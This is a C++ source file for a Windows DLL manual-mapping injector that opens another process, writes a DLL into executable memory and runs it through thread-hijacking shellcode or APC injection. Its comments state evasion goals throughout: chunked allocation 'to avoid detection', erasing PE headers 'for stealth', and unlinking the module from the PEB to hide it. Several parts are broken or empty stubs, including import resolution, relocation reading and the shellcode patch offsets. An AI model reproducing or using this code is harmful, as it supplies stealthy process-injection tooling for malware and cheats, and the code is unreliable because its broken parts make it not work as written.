#include "ManualMapper.h"
#include <TlHelp32.h>
#include <fstream>
#include <random>
#include <iostream>

// Shellcode for executing DLL entry point
static BYTE shellcode_x86[] = {
    0x55,                               // push ebp
    0x89, 0xE5,                        // mov ebp, esp
    0x68, 0x00, 0x00, 0x00, 0x00,      // push 0 (LPVOID)
    0x68, 0x01, 0x00, 0x00, 0x00,      // push DLL_PROCESS_ATTACH
    0x68, 0x00, 0x00, 0x00, 0x00,      // push hModule (to be filled)
    0xB8, 0x00, 0x00, 0x00, 0x00,      // mov eax, DllMain (to be filled)
    0xFF, 0xD0,                        // call eax
    0x89, 0xEC,                        // mov esp, ebp
    0x5D,                               // pop ebp
    0xC3                                // ret
};

bool ManualMapper::InjectDLL(DWORD processId, const std::wstring& dllPath) {
    std::wcout << L"[MANUAL MAPPER] Starting manual mapping injection..." << std::endl;
    
    // Read DLL file into memory
    std::ifstream file(dllPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::wcerr << L"[MANUAL MAPPER ERROR] Failed to open DLL file" << std::endl;
        return false;
    }
    
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<BYTE> dllData(fileSize);
    if (!file.read(reinterpret_cast<char*>(dllData.data()), fileSize)) {
        return false;
    }
    file.close();
    
    // Parse PE headers
    IMAGE_DOS_HEADER* dosHeader;
    IMAGE_NT_HEADERS* ntHeaders;
    if (!ParsePEHeaders(dllData, dosHeader, ntHeaders)) {
        return false;
    }
    
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        return false;
    }
    
    // Allocate memory in target process (stealthily)
    LPVOID targetBase = AllocateMemoryStealthily(hProcess, ntHeaders->OptionalHeader.SizeOfImage);
    if (!targetBase) {
        CloseHandle(hProcess);
        return false;
    }
    
    // Map sections
    if (!MapSections(hProcess, targetBase, dllData, ntHeaders)) {
        VirtualFreeEx(hProcess, targetBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Process relocations
    DWORD_PTR deltaBase = (DWORD_PTR)targetBase - ntHeaders->OptionalHeader.ImageBase;
    if (deltaBase != 0) {
        if (!ProcessRelocations(hProcess, targetBase, ntHeaders, deltaBase)) {
            VirtualFreeEx(hProcess, targetBase, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
    }
    
    // Resolve imports
    if (!ResolveImports(hProcess, targetBase, ntHeaders)) {
        VirtualFreeEx(hProcess, targetBase, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Handle TLS callbacks
    HandleTLSCallbacks(hProcess, targetBase, ntHeaders);
    
    // Erase PE headers for stealth
    EraseHeaders(hProcess, targetBase);
    
    // Calculate entry point
    LPVOID entryPoint = (LPVOID)((DWORD_PTR)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    
    // Execute DLL (try multiple methods)
    bool executed = false;
    
    // Method 1: Thread hijacking (most stealthy)
    executed = ExecuteViaThreadHijacking(hProcess, entryPoint);
    
    if (!executed) {
        // Method 2: APC injection
        executed = ExecuteViaAPCInjection(hProcess, entryPoint);
    }
    
    if (!executed) {
        // Method 3: Queue user APC
        executed = ExecuteViaQueueUserAPC(hProcess, entryPoint);
    }
    
    // Unlink from PEB to hide from module enumeration
    UnlinkFromPEB(hProcess, targetBase);
    
    CloseHandle(hProcess);
    return executed;
}

bool ManualMapper::ParsePEHeaders(const std::vector<BYTE>& dllData,
                                 IMAGE_DOS_HEADER*& dosHeader,
                                 IMAGE_NT_HEADERS*& ntHeaders) {
    dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(const_cast<BYTE*>(dllData.data()));
    
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }
    
    ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(
        const_cast<BYTE*>(dllData.data()) + dosHeader->e_lfanew);
    
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return false;
    }
    
    return true;
}

LPVOID ManualMapper::AllocateMemoryStealthily(HANDLE hProcess, SIZE_T size) {
    // Method 1: Allocate in multiple small chunks to avoid detection
    std::vector<LPVOID> chunks;
    SIZE_T chunkSize = 0x10000; // 64KB chunks
    SIZE_T remainingSize = size;
    
    // Try to allocate near common DLLs to blend in
    LPVOID preferredBase = (LPVOID)0x10000000;
    
    while (remainingSize > 0) {
        SIZE_T allocSize = min(chunkSize, remainingSize);
        LPVOID chunk = VirtualAllocEx(hProcess, preferredBase,
                                     allocSize, MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
        
        if (chunk) {
            chunks.push_back(chunk);
            remainingSize -= allocSize;
            preferredBase = (LPVOID)((DWORD_PTR)chunk + allocSize);
        } else {
            // Allocation failed, try without preferred address
            chunk = VirtualAllocEx(hProcess, nullptr, allocSize,
                                 MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
            if (!chunk) {
                // Clean up previously allocated chunks
                for (auto c : chunks) {
                    VirtualFreeEx(hProcess, c, 0, MEM_RELEASE);
                }
                return nullptr;
            }
            chunks.push_back(chunk);
            remainingSize -= allocSize;
        }
    }
    
    // Return the first chunk as base address
    return chunks.empty() ? nullptr : chunks[0];
}

bool ManualMapper::MapSections(HANDLE hProcess, LPVOID baseAddress,
                              const std::vector<BYTE>& dllData,
                              IMAGE_NT_HEADERS* ntHeaders) {
    IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData > 0) {
            LPVOID sectionDest = (LPVOID)((DWORD_PTR)baseAddress + sectionHeader[i].VirtualAddress);
            
            // Write section data
            if (!WriteProcessMemory(hProcess, sectionDest,
                                  dllData.data() + sectionHeader[i].PointerToRawData,
                                  sectionHeader[i].SizeOfRawData, nullptr)) {
                return false;
            }
            
            // Set proper memory protection
            DWORD oldProtect;
            DWORD newProtect = PAGE_EXECUTE_READWRITE; // Simplified, should parse characteristics
            
            VirtualProtectEx(hProcess, sectionDest,
                           sectionHeader[i].Misc.VirtualSize,
                           newProtect, &oldProtect);
        }
    }
    
    return true;
}

bool ManualMapper::ProcessRelocations(HANDLE hProcess, LPVOID baseAddress,
                                     IMAGE_NT_HEADERS* ntHeaders,
                                     DWORD_PTR deltaBase) {
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0) {
        return true; // No relocations needed
    }
    
    // This is complex and would require reading relocation table from target process
    // Simplified version here
    
    IMAGE_BASE_RELOCATION* relocation = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)baseAddress +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    
    while (relocation->VirtualAddress != 0) {
        LPVOID relocBase = (LPVOID)((DWORD_PTR)baseAddress + relocation->VirtualAddress);
        WORD* relocData = (WORD*)((DWORD_PTR)relocation + sizeof(IMAGE_BASE_RELOCATION));
        
        DWORD numRelocs = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        
        for (DWORD i = 0; i < numRelocs; i++) {
            if ((relocData[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                DWORD_PTR* patch = (DWORD_PTR*)((DWORD_PTR)relocBase + (relocData[i] & 0xFFF));
                
                // Read original value
                DWORD_PTR originalValue;
                ReadProcessMemory(hProcess, patch, &originalValue, sizeof(DWORD_PTR), nullptr);
                
                // Apply relocation
                originalValue += deltaBase;
                
                // Write back
                WriteProcessMemory(hProcess, patch, &originalValue, sizeof(DWORD_PTR), nullptr);
            }
        }
        
        relocation = (IMAGE_BASE_RELOCATION*)((DWORD_PTR)relocation + relocation->SizeOfBlock);
    }
    
    return true;
}

bool ManualMapper::ResolveImports(HANDLE hProcess, LPVOID baseAddress,
                                 IMAGE_NT_HEADERS* ntHeaders) {
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0) {
        return true; // No imports
    }
    
    // This would require complex import resolution
    // Simplified version that would need expansion
    
    return true;
}

bool ManualMapper::HandleTLSCallbacks(HANDLE hProcess, LPVOID baseAddress,
                                     IMAGE_NT_HEADERS* ntHeaders) {
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size == 0) {
        return true; // No TLS
    }
    
    // TLS callback handling would go here
    return true;
}

bool ManualMapper::ExecuteViaThreadHijacking(HANDLE hProcess, LPVOID entryPoint) {
    // Find a thread to hijack
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    DWORD processId = GetProcessId(hProcess);
    HANDLE hThread = nullptr;
    
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,
                                    FALSE, te32.th32ThreadID);
                if (hThread) {
                    break;
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    CloseHandle(hSnapshot);
    
    if (!hThread) {
        return false;
    }
    
    // Suspend thread
    SuspendThread(hThread);
    
    // Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    
    // Allocate shellcode in target process
    LPVOID shellcodeAddr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode_x86),
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!shellcodeAddr) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }
    
    // Update shellcode with actual addresses
    // Note: For DLL_PROCESS_ATTACH, the module handle is the base address where DLL is loaded
    // In this case, we use entryPoint as both the module handle and the entry function
    memcpy(&shellcode_x86[15], &entryPoint, sizeof(LPVOID)); // hModule parameter
    memcpy(&shellcode_x86[20], &entryPoint, sizeof(LPVOID)); // DllMain address
    
    // Write shellcode
    WriteProcessMemory(hProcess, shellcodeAddr, shellcode_x86, sizeof(shellcode_x86), nullptr);
    
    // Backup original EIP and set new one
    DWORD originalEip = ctx.Eip;
    ctx.Eip = (DWORD)shellcodeAddr;
    
    // Set thread context
    SetThreadContext(hThread, &ctx);
    
    // Resume thread
    ResumeThread(hThread);
    
    // Wait a bit for execution
    Sleep(100);
    
    // Restore original context (optional, for stealth)
    SuspendThread(hThread);
    ctx.Eip = originalEip;
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    
    CloseHandle(hThread);
    return true;
}

bool ManualMapper::ExecuteViaAPCInjection(HANDLE hProcess, LPVOID entryPoint) {
    // Find an alertable thread
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    DWORD processId = GetProcessId(hProcess);
    bool injected = false;
    
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (hThread) {
                    if (QueueUserAPC((PAPCFUNC)entryPoint, hThread, 0)) {
                        injected = true;
                    }
                    CloseHandle(hThread);
                    if (injected) break;
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    CloseHandle(hSnapshot);
    return injected;
}

bool ManualMapper::ExecuteViaQueueUserAPC(HANDLE hProcess, LPVOID entryPoint) {
    return ExecuteViaAPCInjection(hProcess, entryPoint);
}

bool ManualMapper::ExecuteViaSetWindowsHookEx(HANDLE hProcess, LPVOID entryPoint) {
    // This method requires the DLL to be properly loaded
    // More complex implementation needed
    return false;
}

void ManualMapper::EraseHeaders(HANDLE hProcess, LPVOID baseAddress) {
    // Overwrite PE headers with random data
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    
    BYTE randomData[0x1000];
    for (int i = 0; i < 0x1000; i++) {
        randomData[i] = dis(gen);
    }
    
    WriteProcessMemory(hProcess, baseAddress, randomData, 0x1000, nullptr);
}

void ManualMapper::UnlinkFromPEB(HANDLE hProcess, LPVOID baseAddress) {
    // This would require reading PEB, finding LDR_DATA_TABLE_ENTRY
    // and unlinking our module from the lists
    // Complex implementation omitted for brevity
}
